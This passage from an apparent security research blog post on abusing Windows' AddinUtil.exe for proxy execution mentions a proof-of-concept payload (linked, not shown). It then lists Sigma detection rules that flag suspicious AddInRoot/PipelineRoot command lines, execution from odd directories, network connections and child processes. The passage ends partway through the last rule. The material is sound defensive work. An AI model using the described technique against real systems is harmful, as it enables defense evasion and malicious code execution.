<p>After correcting our padding and executing our <a href="https://gist.github.com/SILJAEUROPA/a850d476179d73df230a876944e9f3b1#file-addins-store">payload</a> we successfully replicated the attack: <video src="AddinRoot-LOLBAS.mp4" title="Fig 1. AddinUtil.exe AddinRoot Proof of Concept" class="quarto-discovered-preview-image img-fluid" controls=""><a href="AddinRoot-LOLBAS.mp4">Video</a></video> <em>Fig 1. AddinUtil.exe AddinRoot LOLBAS Proof of Concept</em></p>
</section>
<section id="detection-opportunities" class="level3">
<h3 class="anchored" data-anchor-id="detection-opportunities">Detection Opportunities</h3>
<p>The following Sigma rules may be useful for identifying suspicious AddinUtil usage, these are experimental and should be backtested in your environment.</p>
<p><strong>AddinUtil.EXE Execution From Uncommon Directory</strong> <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_addinutil_uncommon_dir_exec.yml">Link</a></p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb8-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">title</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> AddinUtil.EXE Execution From Uncommon Directory</span></span>
<span id="cb8-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">id</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> 6120ac2a-a34b-42c0-a9bd-1fb9f459f348</span></span>
<span id="cb8-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">status</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> experimental</span></span>
<span id="cb8-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">description</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Detects execution of the Add-In deployment cache updating utility (AddInutil.exe) from a non-standard directory.</span></span>
<span id="cb8-5"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">references</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb8-6"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> https://www.blue-prints.blog/content/blog/posts/lolbin/addinutil-lolbas.html</span></span>
<span id="cb8-7"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">author</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Michael McKinley (@McKinleyMike), Tony Latteri (@TheLatteri)</span></span>
<span id="cb8-8"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">date</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> 2023/09/18</span></span>
<span id="cb8-9"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">tags</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb8-10"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> attack.defense_evasion</span></span>
<span id="cb8-11"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> attack.t1218</span></span>
<span id="cb8-12"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">logsource</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb8-13"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">category</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> process_creation</span></span>
<span id="cb8-14"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">product</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> windows</span></span>
<span id="cb8-15"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">detection</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb8-16"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">selection</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb8-17"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Image|endswith</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'\addinutil.exe'</span></span>
<span id="cb8-18"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">OriginalFileName</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'AddInUtil.exe'</span></span>
<span id="cb8-19"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">filter_main_legit_location</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb8-20"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Image|contains</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb8-21"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">':\Windows\Microsoft.NET\Framework\'</span></span>
<span id="cb8-22"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">':\Windows\Microsoft.NET\Framework64\'</span></span>
<span id="cb8-23"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">':\Windows\WinSxS\'</span></span>
<span id="cb8-24"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">condition</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> selection and not 1 of filter_main_*</span></span>
<span id="cb8-25"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">falsepositives</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb8-26"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Unknown</span></span>
<span id="cb8-27"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">level</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> medium</span></span></code></pre></div>
<p><strong>Suspicious AddinUtil.EXE CommandLine Execution</strong> <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_addinutil_suspicious_cmdline.yml">Link</a></p>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb9-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">title</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Suspicious AddinUtil.EXE CommandLine Execution</span></span>
<span id="cb9-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">id</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> 631b22a4-70f4-4e2f-9ea8-42f84d9df6d8</span></span>
<span id="cb9-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">status</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> experimental</span></span>
<span id="cb9-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">description</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">: </span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">|</span></span>
<span id="cb9-5">    Detects execution of the Add-In deployment cache updating utility (AddInutil.exe) with suspicious Addinroot or Pipelineroot paths. An adversary may execute AddinUtil.exe with uncommon Addinroot/Pipelineroot paths that point to the adversaries Addins.Store payload.</span>
<span id="cb9-6"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">references</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb9-7"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> https://www.blue-prints.blog/content/blog/posts/lolbin/addinutil-lolbas.html</span></span>
<span id="cb9-8"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">author</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Nasreddine Bencherchali (Nextron Systems), Michael McKinley (@McKinleyMike), Tony Latteri (@TheLatteri)</span></span>
<span id="cb9-9"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">date</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> 2023/09/18</span></span>
<span id="cb9-10"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">tags</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb9-11"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> attack.defense_evasion</span></span>
<span id="cb9-12"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> attack.t1218</span></span>
<span id="cb9-13"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">logsource</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb9-14"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">category</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> process_creation</span></span>
<span id="cb9-15"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">product</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> windows</span></span>
<span id="cb9-16"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">detection</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb9-17"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">selection_img</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb9-18"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Image|endswith</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'\addinutil.exe'</span></span>
<span id="cb9-19"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">OriginalFileName</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'AddInUtil.exe'</span></span>
<span id="cb9-20"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">selection_susp_1_flags</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb9-21"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">CommandLine|contains</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb9-22"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-AddInRoot:'</span></span>
<span id="cb9-23"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-PipelineRoot:'</span></span>
<span id="cb9-24"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">selection_susp_1_paths</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb9-25"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">CommandLine|contains</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb9-26"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'\AppData\Local\Temp\'</span></span>
<span id="cb9-27"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'\Desktop\'</span></span>
<span id="cb9-28"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'\Downloads\'</span></span>
<span id="cb9-29"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'\Users\Public\'</span></span>
<span id="cb9-30"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'\Windows\Temp\'</span></span>
<span id="cb9-31"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">selection_susp_2</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb9-32"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">CommandLine|contains</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb9-33"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-AddInRoot:.'</span></span>
<span id="cb9-34"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-AddInRoot:"."'</span></span>
<span id="cb9-35"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-PipelineRoot:.'</span></span>
<span id="cb9-36"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'-PipelineRoot:"."'</span></span>
<span id="cb9-37"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">CurrentDirectory|contains</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb9-38"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'\AppData\Local\Temp\'</span></span>
<span id="cb9-39"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'\Desktop\'</span></span>
<span id="cb9-40"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'\Downloads\'</span></span>
<span id="cb9-41"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'\Users\Public\'</span></span>
<span id="cb9-42"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">            </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'\Windows\Temp\'</span></span>
<span id="cb9-43"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">condition</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> selection_img and (all of selection_susp_1_* or selection_susp_2)</span></span>
<span id="cb9-44"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">falsepositives</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb9-45"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Unknown</span></span>
<span id="cb9-46"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">level</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> high</span></span></code></pre></div>
<p><strong>Network Connection Initiated By AddinUtil.EXE</strong> <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_addinutil.yml">Link</a></p>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb10-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">title</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Network Connection Initiated By AddinUtil.EXE</span></span>
<span id="cb10-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">id</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> 5205613d-2a63-4412-a895-3a2458b587b3</span></span>
<span id="cb10-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">status</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> experimental</span></span>
<span id="cb10-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">description</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Detects network connections made by the Add-In deployment cache updating utility (AddInutil.exe), which could indicate command and control communication.</span></span>
<span id="cb10-5"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">references</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb10-6"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> https://www.blue-prints.blog/content/blog/posts/lolbin/addinutil-lolbas.html</span></span>
<span id="cb10-7"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">author</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Michael McKinley (@McKinleyMike), Tony Latteri (@TheLatteri)</span></span>
<span id="cb10-8"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">date</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> 2023/09/18</span></span>
<span id="cb10-9"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">tags</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb10-10"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> attack.defense_evasion</span></span>
<span id="cb10-11"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> attack.t1218</span></span>
<span id="cb10-12"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">logsource</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb10-13"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">category</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> network_connection</span></span>
<span id="cb10-14"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">product</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> windows</span></span>
<span id="cb10-15"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">detection</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb10-16"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">selection</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb10-17"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Initiated</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'true'</span></span>
<span id="cb10-18"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Image|endswith</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'\addinutil.exe'</span></span>
<span id="cb10-19"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">condition</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> selection</span></span>
<span id="cb10-20"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">falsepositives</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb10-21"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Unknown</span></span>
<span id="cb10-22"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">level</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> medium</span></span></code></pre></div>
<p><strong>Uncommon Child Process Of AddinUtil.EXE</strong> <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_addinutil_uncommon_child_process.yml">Link</a></p>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb11-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">title</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> Uncommon Child Process Of AddinUtil.EXE</span></span>
<span id="cb11-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">id</span><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> b5746143-59d6-4603-8d06-acbd60e166ee</span></span>
<span id="cb11-3"><span class="fu" style="color: #4758AB;
background-color: null;
